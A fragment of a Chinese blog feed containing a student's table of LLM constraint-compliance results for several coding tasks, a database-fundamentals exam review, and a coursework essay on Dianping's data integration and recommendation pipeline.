<td>符合</td>
</tr>
<tr>
<td><strong>约束4（错误）</strong></td>
<td>错误</td>
<td>错误</td>
<td>错误</td>
</tr>
<tr>
<td><strong>约束5（遗漏）</strong></td>
<td><strong>符合</strong></td>
<td><strong>符合</strong></td>
<td><strong>符合</strong></td>
</tr>
</tbody></table>
<p>总体的正确率为 15&#x2F;21 &#x3D; 71.42%；</p>
<p>程序2：</p>
<table>
<thead>
<tr>
<th>122_add_elements</th>
<th>第一次</th>
<th>第二次</th>
<th>第三次</th>
</tr>
</thead>
<tbody><tr>
<td><strong>约束1</strong></td>
<td>符合</td>
<td>符合</td>
<td><strong>错误</strong></td>
</tr>
<tr>
<td><strong>约束2</strong></td>
<td>符合</td>
<td>符合</td>
<td><strong>错误</strong></td>
</tr>
<tr>
<td><strong>约束3</strong></td>
<td>符合</td>
<td>符合</td>
<td><strong>错误</strong></td>
</tr>
<tr>
<td><strong>约束4</strong></td>
<td><strong>错误</strong></td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束5</strong></td>
<td><strong>遗漏</strong></td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束4（错误）</strong></td>
<td>错误</td>
<td><strong>符合</strong></td>
<td>错误</td>
</tr>
<tr>
<td><strong>约束5（遗漏）</strong></td>
<td>遗漏</td>
<td><strong>符合</strong></td>
<td><strong>错误</strong></td>
</tr>
</tbody></table>
<p>总体的正确率为 13&#x2F;21 &#x3D; 61.90%；</p>
<p>程序3：</p>
<table>
<thead>
<tr>
<th>123_get_odd_collatz</th>
<th>第一次</th>
<th>第二次</th>
<th>第三次</th>
</tr>
</thead>
<tbody><tr>
<td><strong>约束1</strong></td>
<td>符合</td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束2</strong></td>
<td><strong>错误</strong></td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束3</strong></td>
<td>符合</td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束4</strong></td>
<td><strong>错误</strong></td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束5</strong></td>
<td>符合</td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束4（错误）</strong></td>
<td>错误</td>
<td>错误</td>
<td>错误</td>
</tr>
<tr>
<td><strong>约束5（遗漏）</strong></td>
<td><strong>符合</strong></td>
<td><strong>符合</strong></td>
<td><strong>符合</strong></td>
</tr>
</tbody></table>
<p>总体的正确率为 16&#x2F;21 &#x3D; 76.19%；</p>
<p>程序4：</p>
<table>
<thead>
<tr>
<th>124_valid_date</th>
<th>第一次</th>
<th>第二次</th>
<th>第三次</th>
</tr>
</thead>
<tbody><tr>
<td><strong>约束1</strong></td>
<td>符合</td>
<td>符合</td>
<td><strong>遗漏</strong></td>
</tr>
<tr>
<td><strong>约束2</strong></td>
<td>符合</td>
<td>符合</td>
<td><strong>遗漏</strong></td>
</tr>
<tr>
<td><strong>约束3</strong></td>
<td>符合</td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束4</strong></td>
<td><strong>错误</strong></td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束5</strong></td>
<td><strong>错误</strong></td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束4（错误）</strong></td>
<td>错误</td>
<td>错误</td>
<td>错误</td>
</tr>
<tr>
<td><strong>约束5（遗漏）</strong></td>
<td><strong>错误</strong></td>
<td>遗漏</td>
<td>遗漏</td>
</tr>
</tbody></table>
<p>总体的正确率为 16&#x2F;21 &#x3D; 76.19%；</p>
<p>程序5：</p>
<table>
<thead>
<tr>
<th>125_split_words</th>
<th>第一次</th>
<th>第二次</th>
<th>第三次</th>
</tr>
</thead>
<tbody><tr>
<td><strong>约束1</strong></td>
<td>符合</td>
<td>符合</td>
<td><strong>错误</strong></td>
</tr>
<tr>
<td><strong>约束2</strong></td>
<td>符合</td>
<td>符合</td>
<td><strong>错误</strong></td>
</tr>
<tr>
<td><strong>约束3</strong></td>
<td>符合</td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束4</strong></td>
<td>符合</td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束5</strong></td>
<td>符合</td>
<td>符合</td>
<td>符合</td>
</tr>
<tr>
<td><strong>约束4（错误）</strong></td>
<td><strong>符合</strong></td>
<td>错误</td>
<td><strong>符合</strong></td>
</tr>
<tr>
<td><strong>约束5（遗漏）</strong></td>
<td><strong>符合</strong></td>
<td><strong>符合</strong></td>
<td>遗漏</td>
</tr>
</tbody></table>
<p>总体的正确率为 15&#x2F;21 &#x3D; 71.42%；</p>
<p>以下是与大模型对话的部分截图：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231228165543253.png" alt="image-20231228165550999"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231228165600400.png" alt="image-20231228165600400"></p>
]]></content>
      <categories>
        <category>嵌入式方向</category>
      </categories>
      <tags>
        <tag>LLM</tag>
      </tags>
  </entry>
  <entry>
    <title>数据管理基础2022 期末复习</title>
    <url>/2024/12/19/%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86%E5%9F%BA%E7%A1%80-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="数据管理基础-期末复习"><a href="#数据管理基础-期末复习" class="headerlink" title="数据管理基础 期末复习"></a>数据管理基础 期末复习</h2><h3 id="第二章-关系数据库"><a href="#第二章-关系数据库" class="headerlink" title="第二章 关系数据库"></a>第二章 关系数据库</h3><h4 id="1-关系代数"><a href="#1-关系代数" class="headerlink" title="1. 关系代数"></a>1. 关系代数</h4><p>五种基本关系代数运算：并、差、笛卡尔积、选择、投影。</p>
<h3 id="第三章-SQL"><a href="#第三章-SQL" class="headerlink" title="第三章 SQL"></a>第三章 SQL</h3><h4 id="1-视图"><a href="#1-视图" class="headerlink" title="1. 视图"></a>1. 视图</h4><p><strong>解释：</strong></p>
<p>由一个或几个基本表（或视图）导出的表，是一个虚表。数据库只存放视图的定义，而不存放视图对应的数据。</p>
<p><strong>视图的作用：</strong></p>
<ul>
<li>简化用户的操作</li>
<li>使用户能以多种角度看待同一数据，适应了数据库共享的需要</li>
<li>对重构数据库提供了一定程度的逻辑独立性</li>
<li>对机密数据提供安全保护</li>
<li>适当的利用视图可以更清晰地表达查询</li>
</ul>
<span id="more"></span>



<h3 id="第六章-关系数据理论"><a href="#第六章-关系数据理论" class="headerlink" title="第六章 关系数据理论"></a>第六章 关系数据理论</h3><h4 id="1-1NF"><a href="#1-1NF" class="headerlink" title="1. 1NF"></a>1. 1NF</h4><p>如果一个关系模式R的所有属性都是不可分的基本数据项，则R属于1NF。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241219001312112.png" alt="image-20241219001312112"></p>
<p><strong>存在的问题：</strong></p>
<ul>
<li><strong>数据冗余</strong></li>
<li><strong>修改复杂，更新异常</strong></li>
<li><strong>插入异常</strong></li>
<li><strong>删除异常</strong></li>
</ul>
<h4 id="2-2NF"><a href="#2-2NF" class="headerlink" title="2. 2NF"></a>2. 2NF</h4><p>在1NF的基础上，若R中每个非主属性都完全函数依赖于任何一个候选码，则R属于2NF。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241219001322900.png" alt="image-20241219001322900"></p>
<p><strong>存在的问题：</strong></p>
<ul>
<li>数据冗余：有改进</li>
<li>修改复杂，更新异常：有改进</li>
<li>插入异常：仍然存在</li>
<li>删除异常：仍然存在</li>
</ul>
<h4 id="3-3NF"><a href="#3-3NF" class="headerlink" title="3. 3NF"></a>3. 3NF</h4><p>若R中还不存在传递依赖，则R属于3NF。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241219001330907.png" alt="image-20241219001330907"></p>
<p><strong>存在的问题：</strong></p>
<ul>
<li>数据冗余：有改进</li>
<li>插入异常：有改进</li>
<li>删除异常：有改进</li>
</ul>
<h4 id="4-BCNF"><a href="#4-BCNF" class="headerlink" title="4. BCNF"></a>4. BCNF</h4><p>所有非主属性都完全函数依赖于每个候选码。</p>
<p>所有主属性都完全函数依赖于每个不包含他的候选码。</p>
<p>没有任何属性完全函数依赖于非码的任何一组属性。</p>
<p>也就是 没有非主属性对码传递依赖或部分依赖（3NF）；并且没有码以外的决定因素（BCNF）。</p>
<h4 id="5-4NF"><a href="#5-4NF" class="headerlink" title="5. 4NF"></a>5. 4NF</h4><p>在R中，对于属性组A的每一个值，属性组B都有一组值与之对应，而与其他属性无关，则B多值依赖于A。</p>
<p>4NF限制关系模式的属性之间不允许有非平凡且非函数依赖的多值依赖。</p>
<h3 id="第十章-数据库恢复技术"><a href="#第十章-数据库恢复技术" class="headerlink" title="第十章 数据库恢复技术"></a>第十章 数据库恢复技术</h3><h4 id="1-事务"><a href="#1-事务" class="headerlink" title="1. 事务"></a>1. 事务</h4><p>事务是用户定义的一个数据库操作序列。</p>
<p><strong>事物的ACID特性：</strong></p>
<ul>
<li>原子性：事务中的操作要么都做，要么都不做。</li>
<li>一致性</li>
<li>隔离性：并发执行的各个事务之间不能互相干扰。</li>
<li>持续性：一个事务一旦提交，对数据库的影响是永久性的。</li>
</ul>
<h4 id="2-故障"><a href="#2-故障" class="headerlink" title="2. 故障"></a>2. 故障</h4><p>事务内部的故障；系统故障；介质故障；计算机病毒。</p>
<h4 id="3-日志"><a href="#3-日志" class="headerlink" title="3. 日志"></a>3. 日志</h4><p>日志文件是用来记录事务对数据库的更新操作的文件。</p>
<p>用途：</p>
<ul>
<li>进行事务故障恢复</li>
<li>进行系统故障恢复</li>
<li>协助后备副本进行介质故障恢复</li>
</ul>
<p>登记原则：</p>
<ul>
<li>登记的次序严格按并发事务执行的时间次序</li>
<li>n必须先写日志文件，后写数据库</li>
</ul>
<h4 id="4-恢复"><a href="#4-恢复" class="headerlink" title="4. 恢复"></a>4. 恢复</h4><p>事务故障的恢复：Undo；反向扫描文件日志。</p>
<p>系统故障的恢复：Undo故障发生时未完成事务；Redo已完成事务。</p>
<p>介质故障的恢复：重装数据库，Redo已完成事务。</p>
<p>具有检查点的恢复技术：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241219001357714.png" alt="image-20241219001357714"></p>
<h3 id="第十一章-并发控制"><a href="#第十一章-并发控制" class="headerlink" title="第十一章 并发控制"></a>第十一章 并发控制</h3><h4 id="1-封锁协议"><a href="#1-封锁协议" class="headerlink" title="1. 封锁协议"></a>1. 封锁协议</h4><ul>
<li>**一级封锁协议：**事务修改数据前施加X锁，事务结束后释放锁。<ul>
<li>防止丢失更改</li>
<li>不保证不读脏数据</li>
<li>不保证可重复读</li>
</ul>
</li>
<li>**二级封锁协议：**一级基础上，事务读取数据前施加S锁，读取结束后释放S锁。<ul>
<li>防止丢失更改</li>
<li>防止读脏数据</li>
<li>不保证可重复读</li>
</ul>
</li>
<li>**三级封锁协议：**一级基础上，事务读取数据前施加S锁，事务结束后释放S锁。<ul>
<li>防止丢失更改</li>
<li>防止读脏数据</li>
<li>可重复读</li>
</ul>
</li>
</ul>
<h4 id="2-死锁与活锁"><a href="#2-死锁与活锁" class="headerlink" title="2. 死锁与活锁"></a>2. 死锁与活锁</h4><ul>
<li>**活锁：**采用先来先服务解决。</li>
<li><strong>死锁：</strong><ul>
<li>一次封锁法：事务必须一次性将所要使用的数据全部加锁。降低了并发度；难以确定需要封锁的范围。</li>
<li>顺序封锁法：预先规定一个封锁顺序，按照顺序封锁。维护顺序成本高；难以按规定顺序加锁。</li>
<li>超时法：可能误判死锁；时限太长，死锁难以及时发现。</li>
<li>等待图法：系统周期性地生成事务等待图，发现回路说明出现死锁。</li>
</ul>
</li>
</ul>
<h4 id="3-可串行化调度"><a href="#3-可串行化调度" class="headerlink" title="3. 可串行化调度"></a>3. 可串行化调度</h4><ul>
<li><strong>可串行化</strong>是并发事务正确调度的准则。<ul>
<li>冲突操作是指不同事务对同一数据的读写操作或写写操作。</li>
<li>不同事务的冲突操作和同一事物的两个操作是不能交换的。</li>
<li><strong>冲突可串行化调度</strong></li>
</ul>
</li>
<li><strong>两段锁协议</strong>，事务分为两个阶段，第一阶段获得封锁，成为扩展阶段；第二阶段释放封锁，称为收缩阶段。遵循两段锁协议是可串行化调度。</li>
</ul>
<h4 id="4-多粒度封锁"><a href="#4-多粒度封锁" class="headerlink" title="4. 多粒度封锁"></a>4. 多粒度封锁</h4><ul>
<li><p>**意向锁：**对一个结点施加意向锁，说明其下层节点正在被加锁。</p>
</li>
<li><p>IS锁，IX锁，SIX锁</p>
</li>
</ul>
<h3 id="第十二章-NoSQL"><a href="#第十二章-NoSQL" class="headerlink" title="第十二章 NoSQL"></a>第十二章 NoSQL</h3><h4 id="1-于SQL优劣比较"><a href="#1-于SQL优劣比较" class="headerlink" title="1. 于SQL优劣比较"></a>1. 于SQL优劣比较</h4><p><strong>SQL优点：</strong></p>
<ul>
<li>获取持久化数据</li>
<li>并发控制</li>
<li>集成：多个应用程序可以将数据存储在一个公共的数据库中。</li>
<li>近乎标准的模型</li>
</ul>
<p><strong>SQL缺点：</strong></p>
<ul>
<li><p>阻抗失谐：关系模型和内存中的数据结构之间存在差异。</p>
<p>关系元组不能包含嵌套记录或列表等结构。</p>
</li>
<li><p>与集群不协调</p>
</li>
</ul>
<p><strong>NoSQL特点</strong>：</p>
<ul>
<li>不使用关系模型</li>
<li>在集群中运行良好</li>
<li>无模式：自由、灵活。</li>
<li>混合持久化：在不同的场景使用不同的存储方式。</li>
<li>面向聚合（键值、文件、列族）：操作多个聚合时笨拙。</li>
</ul>
<h4 id="2-键值数据库"><a href="#2-键值数据库" class="headerlink" title="2. 键值数据库"></a>2. 键值数据库</h4><p>聚合不透明，可以存储任意数据。</p>
<p>通过键查询。</p>
<h4 id="3-文档数据库"><a href="#3-文档数据库" class="headerlink" title="3. 文档数据库"></a>3. 文档数据库</h4><p>聚合透明，定义了允许的结构与数据类型，可以更加灵活地访问数据。</p>
<p>基于文档的内部结构查询。</p>
<h4 id="4-列族数据库"><a href="#4-列族数据库" class="headerlink" title="4. 列族数据库"></a>4. 列族数据库</h4><p>每一行是一个聚合，行中有很多列族。</p>
<h4 id="5-图数据库"><a href="#5-图数据库" class="headerlink" title="5. 图数据库"></a>5. 图数据库</h4><p>不面向聚合，不利于集群。</p>
<p>重视数据间的关系，查询内部相互关系比较紧密的数据模型时效率高。</p>
]]></content>
      <categories>
        <category>数据管理基础</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>数据管理基础</tag>
      </tags>
  </entry>
  <entry>
    <title>数据集成-作业一</title>
    <url>/2024/12/15/%E6%95%B0%E6%8D%AE%E9%9B%86%E6%88%90-%E4%BD%9C%E4%B8%9A%E4%B8%80/</url>
    <content><![CDATA[<h1 id="作业一-大众点评应用系统集成"><a href="#作业一-大众点评应用系统集成" class="headerlink" title="作业一 大众点评应用系统集成"></a>作业一 大众点评应用系统集成</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>大众点评是中国领先的本地生活信息及交易平台，也是全球最早建立的独立第三方消费点评网站。大众点评不仅为用户提供商户信息、消费点评及消费优惠等信息服务，同时亦提供团购、餐厅预订、外卖及电子会员卡等O2O(线上到线下)交易服务。本文试从大众点评推荐业务出发，分析大众点评推荐业务是如何将抽象的统计学数据以及非结构化的原始数据转化成了规范化的、特征化的系统推荐需要的数据。</p>
 <span id="more"></span>

<h2 id="一-业务分析与目标确定"><a href="#一-业务分析与目标确定" class="headerlink" title="一. 业务分析与目标确定"></a>一. 业务分析与目标确定</h2><p>近年来，随着信息、科技的迅猛发展，对于数据的采集、存储、处理和传播的数量与日俱增。企业常采用数据共享以使得工作者更高效地使用数据。然后数据的来源、格式、特点性质往往不同，严重阻碍了数据的流动与共享，数据集成应运而生，可以把不同来源、格式、特点性质的数据在逻辑上或物理上有机地集中，从而为企业提供全面的数据共享，成为了如今企业最重要的技术之一。大众点评作为领先于业界的平台，也使用了数据集成这一技术。</p>
<p>大众点评最主要功用在于可以根据智能排序、筛选等功能，为用户提供心仪的餐厅推荐，本文从这一业务入手，重点分析其集成中数据或调用的逻辑和数据集成相关的技术，对于推荐业务相关的机器学习等其他技术，也有所涉及，以更全面地了解大众点评是如何处理、利用数据的。</p>
<p>对于推荐功能，大众点评认为其应有如下特征：</p>
<ol>
<li>全面：大众点评应该收集尽可能的关于各种餐厅的数据，以便将尽可能多的餐厅信息展现给用户以供选择，亦可以将餐厅正确地分类，为用户提供个性化推荐</li>
<li>多样化：大众点评应该不断地发现用户的消费意愿，收集新餐厅的信息，并且确保新的餐厅不会一直无法获得用户市场(用户市场不能总被固定的餐厅所占据)</li>
<li>个性化：大众点评的首页推荐应该根据以往客户浏览大众点评的数据信息对用户的特征、行为作出预测分析，以进行个性化推荐，帮助他们更快更好地找到自己喜欢的类型的餐厅</li>
</ol>
<p>以此为基础，大众点评团队确定了如下的业务目标：</p>
<ol>
<li>获取比其他竞争对手更多的数据信息，并对其数据集成以合理地分析应用</li>
<li>根据用户的行为产生的数据信息进行分析，得到用户特征以进行个性化推荐</li>
<li>预测用户的消费意愿，不断获取新的数据信息</li>
</ol>
<h2 id="二-大众点评用户行为数据构建"><a href="#二-大众点评用户行为数据构建" class="headerlink" title="二. 大众点评用户行为数据构建"></a>二. 大众点评用户行为数据构建</h2><p>红利缩减的当下，互联网的粗放式发展模式已经转向精耕细作。面对海量的用户行为数据，如何将其集成提炼，发挥出这些数据的真正价值，是提升用户体验的关键点。</p>
<p>大众点评在精细化方面做了很多深度思索。根据用户在App中的行为、频率不同，可以划分出各个层次的用户生命周期，不同周期中的用户所需要的体验和所进行的活动都有所参差，对此就需要不同的运营策略。比如针对成长期的用户，主要运营方向是让其了解平台的核心功能，提高认知，如写点评、分享、收藏等；对于新激活用户则需要即时的激励来形成奖励反馈，这就需要很高的时效性，通常在毫秒级别，才能有效提升新用户的留存率。</p>
<p>针对上述精细化场景，系统需要实时感知极大量用户行为，分析并构建画像，同时要求高时效性和稳定性。对此，大众点评搭建了一套用户行为系统（UAS, User Action System）。</p>
<p>UAS主要处理的问题如下：</p>
<ol>
<li>**格式不一致：**平台业务繁多，用户行为分散，格式不统一，难以一起利用。如有些行为消息是基于自研消息中间件Mafka&#x2F;Swallow，有些行为消息是基于流量打点的Kafka消息，还有一些行为没有对应的业务消息。对此首先要制定一个统一的数据收集标准。</li>
<li>**上报不及时：**部分用户行为的收集依托于公司统一的流量打点体系，时效性不够高。</li>
<li>**查询差异化：**各个业务所需要的用户行为数据有所区别，如对次数的统计，不同业务就有各自的统计逻辑。这就需要一个统一且灵活的系统架构。</li>
</ol>
<h4 id="数据格式的集成"><a href="#数据格式的集成" class="headerlink" title="数据格式的集成"></a>数据格式的集成</h4><p>数据格式直接影响到集成的范围和利用率，只有统一的数据格式才能供各部门交叉收集、利用，实现高一致性，为企业提供全面的数据共享。大众点评参考了5W1H模型，抽象出几大类用户行为，作为记录的标准格式：</p>
<p><img data-src="C:\Users\86188\Desktop\数据集成\640.jpg" alt="0"></p>
<p>其中，what标签对应点赞、评论、分享等行为；where标签对应了行为作用对象的ID，如商户ID、评论ID等；how则是一些额外属性，如浏览商户的商户品类、签到商家的城市等。</p>
<h4 id="数据处理的实时性"><a href="#数据处理的实时性" class="headerlink" title="数据处理的实时性"></a>数据处理的实时性</h4><p>流量打点上报的数据格式是标准化的，但是上报有时延，也存在数据丢失的情况。为此，大众点评团队额外维护了一个通用的MAPI上报通道，直接从客户端通过专有的长连接通道进行上报，保证数据的时效性，上报后的数据处理之后，进行了标准化，再以消息的形式传播出去，并且按照一定的维度，进行了TOPIC的拆分。两种渠道分别用于不同用户场景，对外无感知。</p>
<p><img data-src="C:\Users\86188\Desktop\数据集成\641.jpg" alt="641"></p>
<h4 id="服务的统一"><a href="#服务的统一" class="headerlink" title="服务的统一"></a>服务的统一</h4><p>通常对于不同的应用场景，所要求的用户行为处理的数据规模和时效性是不同的。一些情况下，用户行为上报之后，需要立即进行相关查询，这就需要很高的写入和查询性能；另一些情况下，只需要进行行为的写入，这就允许使用异步的方法。对于这些不同的场景，尽管解决方案不同，但提供的服务接口是统一的UAS服务。</p>
<h4 id="架构的统一"><a href="#架构的统一" class="headerlink" title="架构的统一"></a>架构的统一</h4><p>数据收集、处理分发、业务加工、数据持久化等数个方面都要保证质量与性能，为此需要一个统一的系统架构来应对现有要求与业务的扩展，满足日益增长的数据需求。</p>
<p>针对以上想法构建出的UAS系统整体架构如下：</p>
<p><img data-src="C:\Users\86188\Desktop\数据集成\642.jpg" alt="642"></p>
<p>实时数据源基于公司消息中间件Mafka和开源消息中间件Kafka。实时计算使用Storm实时大数据处理框架，其中的Spout可以方便对接实时消息队列，保障了时效性，其他的心跳检测机制和Acker机制等，也使得可用性等都有所保障。</p>
<p>离线历史数据来源于Hive和HDFS，便于大量数据的存储和并行运算。离线处理主要包含了MR模块和Spark模块，一些ETL操作基于MR模块，一些用户行为数据分析则交由Spark。另外美团内部有基于Hive搭建的ETL平台可供大众点评开发数据处理任务和数据传输任务，并且配置相关的任务调度信息。</p>
<h4 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h4><p>对于需要实时处理的数据，构建了基于大众点评全网的流量网关，所有用户产生的行为数据，都会通过实时上报通道进行上报，并且会在网关中流转，然后对行为数据进行加工。主要流程如下图：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214130905.png" alt="image-20241215214130905"></p>
<p>对于离线数据，依赖遵循一套数据仓库分层体系来构建用户行为的数据仓库，通过发布一些通用的数据来服务用户，对于一些长时间段的数据，会采取如先以天为周期聚合，再做一次总的聚合等办法来进行解决。</p>
<p>在近实时处理中，将经过流量网关的数据通过Kafka2Hive的流程，写入到Hive中，并且保证整个过程的时延不超过15分钟，算法团队可以利用近实时的数据，结合其他的海量数据，进行整体的加工和存储。</p>
<p>通过离线、实时、近实时的不同的处理方法，满足了业务不同的时效性需求。</p>
<h4 id="数据存储"><a href="#数据存储" class="headerlink" title="数据存储"></a>数据存储</h4><p>数据在进行处理之后成为标准化数据后，再通过明细存储和聚合存储进行存储。</p>
<p>明细存储主要针对用户的核心操作行为，包括签到、点击、分享、浏览、评论等，这类数据将被按照一定的粒度进行拆分，存储在拥有一定的过期机制的搜索集群中，具体的操作流程如下图：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/640" alt="图片"></p>
<p> 而在某些要求高性能的场景下，要求更快的查询和更短的响应时间，大众点评采取了引入NoSQL存储，使用存储中间件Squirrel和Cellar，其中Cellar是基于淘宝开源的Tair进行开发的，而Squirrel是基于RedisCluster进行开发的。</p>
<h4 id="系统特性"><a href="#系统特性" class="headerlink" title="系统特性"></a>系统特性</h4><ol>
<li>系统灵活性： 对于用户的行为数据，通过Transformer组件进行数据扩展来满足业务需求；还支持业务方自己编写查询逻辑或采用插件托管的方式，以此做到对外接口和服务的一致统一。</li>
<li>低延时性：采用Lambda架构来处理长周期、存储大的数据，保证了数据完备性的同时实现了数据的时效性。架构包含Batch Layer批处理层和Speed Layer实时计算层，分别用以预处理历史数据和计算实时数据。</li>
<li>数据可用性：Speed Layer会保留三天的数据，来确保覆盖全量数据。</li>
<li>监控：实现从用户行为数据的产生，到收集分发、到数据处理和存储的全过程监控。</li>
</ol>
<h2 id="三-数据清洗与特征处理"><a href="#三-数据清洗与特征处理" class="headerlink" title="三. 数据清洗与特征处理"></a>三. 数据清洗与特征处理</h2><p>经过上述操作，大众点评能够将抽象的统计学数据以及非结构化的业务数据转化成了规范化的、特征化的系统推荐的输入数据。随着用户数量的增多以及时间的积累，评论数据与业务数据的量成几何增长。利用数据仓库对这些数据进行挖掘与分析，能够为今后的业务方向提供知识决策，此外，大众点评中的评论数据还能够与美团公司旗下的美团APP进行共享，进行辅助决策帮助。</p>
<p>为了避免无关数据与干扰数据的影响，以及能够准确地对干净数据进行分析以便辅助决策，本章将对数据清洗与数据的特征处理进行一个大致介绍。</p>
<h4 id="数据选取"><a href="#数据选取" class="headerlink" title="数据选取"></a>数据选取</h4><p>在确定业务目标后，需要确定能够实现该目标的数据—―即事先梳理可能决定用户是否决定打卡店铺相关的数据。通常而言，能够借鉴一些业务经验，同时运用特征选择、分析方法辅助选择数据。</p>
<p>根据经验判断，可能影响用户决策的重要因素由：距离、用户实时兴趣、价格、评分、餐厅种类等等。在确定数据范围后，需要对选中的数据再次进行可用性评估，评估内容包括:获取难度、数据规模、数据准确率等等。</p>
<p>据调查显示，大众点评所使用的特征获取平台与美团旗下的美团APP一致，该平台由三部分框架组成：训练样本生成、特征生产以及特征获取计算。</p>
<p><img data-src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20230303134900332.png" alt="image-20230303134900332"></p>
<h4 id="数据清洗"><a href="#数据清洗" class="headerlink" title="数据清洗"></a>数据清洗</h4><p>数据清洗(Data Cleaning)是对数据进行重新审查和校验的过程，目的在于删除重复信息与干扰信息、纠正存在的错误，并提供数据一致性等等。</p>
<p>数据清洗的主要类型有：</p>
<ol>
<li><p>残缺数据：这—类数据主要是—些应该有的信息缺失，如供应商的名称、分公司的名称、客户的区域信息缺失、业务系统中主表与明细表不能匹配等。对于这一类数据过滤出来，按缺失的内容分别写入不同Excel文件向客户提交，要求在规定的时间内补全。补全后才写入数据仓库。</p>
</li>
<li><p>错误数据：这一类错误产生的原因是业务系统不够健全，在接收输入后没有进行判断直接写入后台数据库造成的，比如数值数据输成全角数字字符、字符串数据后面有一个回车操作、日期格式不正确、日期越界等。这一类数据也要分类，对于类似于全角字符、数据前后有不可见字符的问题，只能通过写SQL语句的方式找出来，然后要求客户在业务系统修正之后抽取。日期格式不正确的或者是日期越界的这一类错误会导致ETL运行失败，这一类错误需要去业务系统数据库用SQL的方式挑出来，交给业务主管部门要求限期修正，修正之后再抽取。</p>
</li>
<li><p>重复数据：<br>对于这—类数据，通常做法是将重复数据记录的所有字段导出，让客户确认并整理。</p>
</li>
</ol>
<p>数据清洗步骤：</p>
<ol>
<li><p>对缺失值进行清洗：一般来说，缺失值是最常见的数据问题，处理缺失值也有很多方法，我们需要按照步骤来做，第一就是确定缺失值范围：对每个字段都计算其缺失值比例，然后按照缺失比例和字段重要性，分别制定策略。</p>
</li>
<li><p>去除不需要的字段：实际操作中是十分简单的，直接删掉就可以了，不过需要提醒大家的是，清洗数据的时候每做一步都备份—下，或者在小规模数据上试验成功再处理全量数据，如果删错数据就会追悔莫及。</p>
</li>
<li><p>填充缺失内容：这是因为某些缺失值可以进行填充，方法有三种，分别是以业务知识或经验推测填充缺失值、以同一指标的计算结果(均值、中位数、众数等)填充缺失值、以不同指标的计算结果填充缺失值。</p>
</li>
<li><p>重新取数：由于某些指标非常重要又缺失率高，那就需要和取数人员或业务人员了解，是否有其他渠道可以取到相关数据。这就是缺失值清洗的步骤。</p>
</li>
<li><p>关联性验证：如果你的数据有多个来源，那么有必要进行关联性验证。如果不关联，这个数据据需要清洗。</p>
</li>
</ol>
<p><img data-src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20230303135258797.png" alt="image-20230303135258797"></p>
<h4 id="数据标注"><a href="#数据标注" class="headerlink" title="数据标注"></a>数据标注</h4><p>数据标注模块根据 globalId（一次搜索的全局唯一 标示）和相应的 id 为 key，将相关数据关联起来 ，最终生成一份标注好是否被点击、打卡、支付等等的标注数据。同时这份标注数据携带了本次展现的详细特征信息。</p>
<p><img data-src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20230303135340312.png" alt="image-20230303135340312"></p>
<h4 id="特征分类"><a href="#特征分类" class="headerlink" title="特征分类"></a>特征分类</h4><p>在清洗以及标注好数据后，应当对特征进行分类，对于不同的特征应当采取不同的处理方法。常用的特征处理方法如下:</p>
<ol>
<li>Low Level特征和High Level 特征：Low level特征是较低级别的特征，主要是原始特征，不需要或者需要非常少的人工处理和干预，例如文本特征中的词向量特征、图像特征中的像素点、用户id、商品 id等；High level特征是经过较复杂的处理，结合部分业务逻辑或者规则、模型得到的特征，例如人工打分，模型打分等。一般前者用于简单的模型，后者用于复杂的模型</li>
<li>稳定特征与动态特征：稳定特征是变化频率(更新频率）较少的特征，例如评价平均分、团购单价格等，在较长的时间段内都不会发生变化。动态特征是更新变化比较频繁的特征，有些甚至是实时计算得到的特征</li>
<li>二值特征、连续特征、枚举特征：二值特征主要是0&#x2F;1特征，即特征只取两种值:0或者1；连续值特征是取值为有理数的特征，特征取值个数不定，例如距离特征；枚举值特征主要是特征有固定个数个可能值</li>
</ol>
<h4 id="特征选择方法"><a href="#特征选择方法" class="headerlink" title="特征选择方法"></a>特征选择方法</h4><p><img data-src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20230303135737471.png" alt="image-20230303135737471"></p>
<h2 id="四-具体业务执行"><a href="#四-具体业务执行" class="headerlink" title="四. 具体业务执行"></a>四. 具体业务执行</h2><p>大众点评拥有一套完善的推荐系统框架，包括基于机器学习的多选品召回与排序策略以及从海量大数据的离线计算到高并发在线服务的推荐引擎。在经过上文所介绍的流程过后，通过该推荐系统中的召回生成推荐的候选集以及排序负责将多个算法策略的结果进行个性化排序。</p>
<p><img data-src="C:/Users/86188/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="IMG_256"></p>
<p>上图即是大众点评的实时推荐数据流</p>
